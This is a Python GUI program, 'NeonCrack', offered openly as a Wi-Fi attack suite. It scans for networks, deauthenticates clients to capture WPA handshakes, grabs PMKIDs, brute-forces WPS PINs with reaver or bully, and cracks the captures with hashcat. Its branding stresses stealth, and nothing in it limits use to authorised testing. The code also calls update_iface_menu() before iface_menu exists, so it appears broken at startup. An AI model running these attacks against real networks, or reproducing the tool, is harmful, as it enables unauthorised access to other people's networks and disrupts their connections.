#!/usr/bin/env python3
"""
NeonCrack v2.3 – Complete Cyberpunk Wi-Fi Attack Suite
Created by Null_Lyfe — “Stay hidden. Strike silently.”
Dependencies:
  sudo apt install aircrack-ng hcxdumptool hcxtools hashcat reaver bully wash hashid
Run:
  sudo python3 neoncrackV2.3.py
"""
import os, subprocess, threading, csv, time, signal, shutil, sys
from datetime import datetime
from collections import Counter
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox

# ── UI palette ────────────────────────────────────────────────────────────────
ACCENT, NEON, BGC = "#ff0080", "#00f0ff", "#0f0f23"
FONT = ("Courier New", 11)

CAP_DIR = "neoncrack_captures"
os.makedirs(CAP_DIR, exist_ok=True)

root = Tk()
root.title("NeonCrack v2.3")
root.configure(bg=BGC)
root.geometry("1060x760")

# ── Tk variables ──────────────────────────────────────────────────────────────
iface_var, target_var   = StringVar(), StringVar()
scan_time               = IntVar(value=45)
pcap_var, word_var      = StringVar(), StringVar()
hash_input              = StringVar()

attack_proc = None        # handle for running external attack
networks    = []          # [(bssid, ch, essid, enc, wps)]

# ── helpers ───────────────────────────────────────────────────────────────────
def run(cmd, outfile=None):
    """Detached Popen with whole-process-group killable later."""
    out = open(outfile, "wb") if outfile else subprocess.DEVNULL
    return subprocess.Popen(cmd, stdout=out, stderr=subprocess.STDOUT,
                            preexec_fn=os.setsid)

def log(widget, text):              # quick scroll-log helper
    widget.insert(END, text + "\n")
    widget.see(END); widget.update()

def interfaces():
    try:
        out = subprocess.check_output(["iw", "dev"], text=True)
        return [l.split()[1] for l in out.splitlines()
                if l.strip().startswith("Interface")]
    except subprocess.CalledProcessError:
        return []

def monitor(iface, enable=True):
    if not iface: return
    subprocess.run(["airmon-ng", "start" if enable else "stop", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    iface_var.set(iface + "mon" if enable and not iface.endswith("mon")
                  else iface.replace("mon", ""))
    update_iface_menu()

def update_iface_menu():
    menu = iface_menu["menu"]; menu.delete(0, "end")
    for i in interfaces():
        menu.add_command(label=i, command=lambda v=i: iface_var.set(v))

# ── scanning ──────────────────────────────────────────────────────────────────
def parse_csv(path):
    nets = []
    with open(path, newline='') as f:
        for r in csv.reader(f):
            if len(r) > 13 and r[0] and r[0] != "BSSID":
                bssid = r[0].strip().upper()
                ch    = r[3].strip()
                enc   = r[5].strip()
                essid = r[13].strip() or "<hidden>"
                nets.append((bssid, ch, essid, enc))
    return nets

def detect_wps(mon_iface, duration=15):
    try:
        out = subprocess.check_output(
            ["timeout", str(duration), "wash", "-i", mon_iface, "-s", "-g"],
            text=True, stderr=subprocess.DEVNULL)
        return {line[:17].strip().upper() for line in out.splitlines()
                if ':' in line}
    except subprocess.CalledProcessError:
        return set()

def scan():
    iface = iface_var.get()
    if not iface:
        messagebox.showwarning("Missing", "Select a wireless interface first.")
        return
    monitor(iface, True); mon = iface_var.get()
    fname = os.path.join(CAP_DIR, f"scan_{datetime.now():%Y%m%d_%H%M%S}")
    proc  = run(["airodump-ng", "-w", fname, "--output-format", "csv", mon])
    log(scan_out, f"[*] Scanning on {mon} for {scan_time.get()} s …")
    time.sleep(scan_time.get()); proc.terminate(); time.sleep(2)
    csv_path = fname + "-01.csv"
    if not os.path.isfile(csv_path):
        log(scan_out, "[!] airodump failed to write CSV"); monitor(mon, False); return
    base_nets = parse_csv(csv_path)
    wps_set   = detect_wps(mon)
    global networks; networks = []
    scan_out.delete("1.0", END)
    scan_out.insert(END, "# |      BSSID       | CH | ENC | WPS | ESSID\n")
    scan_out.insert(END, "-" * 70 + "\n")
    for idx, (bssid, ch, essid, enc) in enumerate(base_nets, 1):
        wps = "Y" if bssid in wps_set else "-"
        networks.append((bssid, ch, essid, enc, wps))
        scan_out.insert(END, f"{idx:2d}| {bssid} |{ch:>3}|{enc:^5}|  {wps} | {essid}\n")
    target_menu["menu"].delete(0, "end")
    for i in range(len(networks)):
        target_menu["menu"].add_command(
            label=str(i + 1), command=lambda v=i: target_var.set(str(v)))
    log(scan_out, f"[+] Scan complete — {len(networks)} networks.")
    monitor(mon, False)

def pick_target():
    if not target_var.get():
        messagebox.showinfo("Target", "Select a target number first.")
        return None
    return networks[int(target_var.get())]

# ── attack routines ───────────────────────────────────────────────────────────
def start_pmkid():
    t, iface = pick_target(), iface_var.get();  # (bssid,ch,essid,enc,wps)
    if not t: return
    bssid, ch, essid, enc, wps = t
    monitor(iface, True); mon = iface_var.get()
    pcap = os.path.join(CAP_DIR, f"pmkid_{essid}_{int(time.time())}.pcapng")
    global attack_proc
    attack_proc = run(["hcxdumptool", "-i", mon, "--filterlist_ap", bssid,
                       "--enable_status=1"], pcap)
    log(att_out, f"[*] PMKID attack running — output → {pcap}")

def start_handshake():
    t, iface = pick_target(), iface_var.get()
    if not t: return
    bssid, ch, essid, _, _ = t
    monitor(iface, True); mon = iface_var.get()
    prefix = os.path.join(CAP_DIR, f"hs_{essid}_{int(time.time())}")
    global attack_proc
    attack_proc = run(["airodump-ng", "-c", ch, "--bssid", bssid,
                       "-w", prefix, mon])
    run(["aireplay-ng", "-0", "10", "-a", bssid, mon]).wait()
    log(att_out, f"[*] Handshake capture running — {prefix}-01.cap")

def start_wps():
    t, iface = pick_target(), iface_var.get()
    if not t: return
    bssid, ch, essid, _, _ = t
    monitor(iface, True); mon = iface_var.get()
    tool = "reaver" if shutil.which("reaver") else "bully"
    cmd  = ["reaver", "-i", mon, "-b", bssid, "-c", ch, "-vv"] \
           if tool == "reaver" else ["bully", "-b", bssid, "-c", ch, mon]
    global attack_proc
    attack_proc = run(cmd,
        os.path.join(CAP_DIR, f"wps_{essid}_{int(time.time())}.log"))
    log(att_out, f"[*] {tool} WPS attack launched on {essid}")

def stop_attack():
    global attack_proc
    if attack_proc:
        os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
        attack_proc = None
    monitor(iface_var.get(), False)
    log(att_out, "[!] Attack stopped.")

# ── cracking ──────────────────────────────────────────────────────────────────
def load_pcap():
    pcap_var.set(filedialog.askopenfilename(
        title="Select capture",
        filetypes=[("Capture", "*.cap *.pcap *.pcapng *.hccapx")]))

def load_word():
    word_var.set(filedialog.askopenfilename(
        title="Select wordlist", filetypes=[("Wordlist", "*.txt *.lst")]))

def crack():
    cap, wl = pcap_var.get(), word_var.get()
    if not (cap and wl):
        messagebox.showwarning("Missing", "Select both capture and wordlist."); return
    if cap.endswith((".pcap", ".pcapng", ".cap")):
        conv = os.path.join(CAP_DIR, f"conv_{int(time.time())}.hccapx")
        run(["hcxpcapngtool", "-o", conv, cap]).wait()
        crack_out.insert(END, f"[+] Converted → {conv}\n")
        cap = conv
    run(["hashcat", "-m", "22000", cap, wl, "--force"])
    crack_out.insert(END, "[*] Hashcat started (check terminal)…\n")

# ── hash identifier ───────────────────────────────────────────────────────────
def identify_hash(h):
    if shutil.which("hashid"):
        try:
            return subprocess.check_output(["hashid", "-m", h],
                                           text=True, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            pass
    l = len(h)
    if l == 32:  return "Likely MD5"
    if l == 40:  return "Likely SHA-1"
    if l == 64:  return "Likely SHA-256"
    return "Unknown hash type"

def hashid_action():
    h = hash_input.get().strip()
    if not h: return
    res = identify_hash(h)
    hashid_out.delete("1.0", END); hashid_out.insert(END, res + "\n")

# ── cleaner ───────────────────────────────────────────────────────────────────
def clean_capture():
    cap = filedialog.askopenfilename(
        title="Select pcapng to clean", filetypes=[("pcapng", "*.pcapng")])
    if not cap: return
    out = cap.replace(".pcapng", "_cleaned.pcapng")
    run(["hcxpcapngtool", "--cleanall", "-o", out, cap]).wait()
    cleaner_out.insert(END, f"[+] Cleaned file saved → {out}\n")

# ── stats ─────────────────────────────────────────────────────────────────────
def show_stats():
    pot = os.path.expanduser("~/.hashcat/hashcat.potfile")
    if not os.path.isfile(pot):
        stats_out.delete("1.0", END); stats_out.insert(END, "No potfile found.\n"); return
    dist = Counter()
    with open(pot) as f:
        for line in f:
            if ':' in line:
                pwd = line.split(':', 1)[1].strip()
                dist[len(pwd)] += 1
    stats_out.delete("1.0", END)
    stats_out.insert(END, "Len | Count\n--------------\n")
    for l, c in sorted(dist.items()):
        stats_out.insert(END, f"{l:>3} | {c}\n")

# ── GUI layout ────────────────────────────────────────────────────────────────
style = ttk.Style();  style.theme_use("alt")
style.configure("TNotebook.Tab", background="#1a1a1a",
                foreground=NEON, font=FONT, padding=8)

nb = ttk.Notebook(root); nb.pack(fill=BOTH, expand=True)
frames = {}
for key, label in [("scan","⚡ Scan"), ("attack","⚔️ Attacks"), ("crack","💥 Crack"),
                   ("hash","🔎 Hash ID"), ("clean","🧹 Cleaner"), ("stats","📊 Stats")]:
    f = Frame(nb, bg=BGC); nb.add(f, text=label); frames[key] = f

#  Scan tab
ts = frames["scan"]
update_iface_menu()
iface_menu = OptionMenu(ts, iface_var, *interfaces()); iface_menu.pack(pady=4)
Button(ts, text="Enable Monitor",  bg=ACCENT, fg="white",
       command=lambda: monitor(iface_var.get(), True)).pack(pady=2)
Button(ts, text="Disable Monitor", bg="#ff0030", fg="white",
       command=lambda: monitor(iface_var.get(), False)).pack(pady=2)
Spinbox(ts, from_=15, to=180, textvariable=scan_time, width=5).pack()
Button(ts, text="Start Scan", bg=ACCENT, fg="white",
       command=lambda: threading.Thread(target=scan, daemon=True).start()).pack(pady=4)
scan_out = scrolledtext.ScrolledText(ts, width=110, height=24,
                                     bg="#0d0d17", fg=NEON, font=("Consolas", 10))
scan_out.pack()

#  Attack tab
ta = frames["attack"]
target_menu = OptionMenu(ta, target_var, "")
target_menu.pack(fill=X, padx=10, pady=4)
for txt, fn in [("PMKID Capture", start_pmkid),
                ("4-Way Handshake", start_handshake),
                ("WPS Bruteforce", start_wps)]:
    Button(ta, text=txt, command=fn, bg=ACCENT,
           fg="white").pack(fill=X, padx=20, pady=2)
Button(ta, text="Stop Attack", command=stop_attack,
       bg="#ff0030", fg="white").pack(fill=X, padx=20, pady=4)
att_out = scrolledtext.ScrolledText(ta, width=110, height=18,
                                    bg="#0d0d17", fg=NEON, font=("Consolas", 10))
att_out.pack()

#  Crack tab
tc = frames["crack"]
Entry(tc, textvariable=pcap_var, width=80).pack(pady=2)
Button(tc, text="Browse pcap", command=load_pcap).pack()
Entry(tc, textvariable=word_var, width=80).pack(pady=2)
Button(tc, text="Browse wordlist", command=load_word).pack()
Button(tc, text="Start Crack", bg=ACCENT, fg="white",
       command=lambda: threading.Thread(target=crack, daemon=True).start()).pack(pady=4)
crack_out = scrolledtext.ScrolledText(tc, width=110, height=18,
                                      bg="#0d0d17", fg=NEON, font=("Consolas", 10))
crack_out.pack()

#  Hash-ID tab
th = frames["hash"]
Entry(th, textvariable=hash_input, width=80).pack(pady=4)
Button(th, text="Identify Hash", command=hashid_action,
       bg=ACCENT, fg="white").pack()
hashid_out = scrolledtext.ScrolledText(th, width=110, height=18,
                                       bg="#0d0d17", fg=NEON, font=("Consolas", 10))
hashid_out.pack()

#  Cleaner tab
cl = frames["clean"]
Button(cl, text="Select & Clean pcapng", command=clean_capture,
       bg=ACCENT, fg="white").pack(pady=4)
cleaner_out = scrolledtext.ScrolledText(cl, width=110, height=20,
                                        bg="#0d0d17", fg=NEON, font=("Consolas", 10))
cleaner_out.pack()

#  Stats tab
st = frames["stats"]
Button(st, text="Refresh Stats", command=show_stats,
       bg=ACCENT, fg="white").pack(pady=4)
stats_out = scrolledtext.ScrolledText(st, width=110, height=20,
                                      bg="#0d0d17", fg=NEON, font=("Consolas", 10))
stats_out.pack()

# ── launch ────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if os.geteuid() != 0:
        messagebox.showerror("Need root", "Run NeonCrack with sudo.")
        sys.exit(1)
    root.mainloop()